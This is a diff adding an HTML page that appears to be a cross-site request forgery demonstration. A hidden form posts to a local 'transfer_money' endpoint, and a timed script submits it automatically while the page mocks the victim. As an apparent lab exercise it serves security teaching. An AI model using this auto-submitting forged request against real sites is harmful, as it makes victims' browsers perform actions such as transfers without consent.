@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker</title>
+</head>
+<style>
+    .center {
+        text-align: center;
+    }
+
+    .red {
+        color: red;
+    }
+</style>
+
+<body>
+    <p class="center red">Haha transfering money even if you don't want xD</p>
+
+    <form action="http://127.0.0.1:9090/transfer_money" method="POST">
+        <input type="hidden" name="message" value="test">
+    </form>
+
+    <script>
+        setTimeout(() => {
+            document.forms[0].submit();
+        }, 1500)
+    </script>
+</body>
+
+</html>
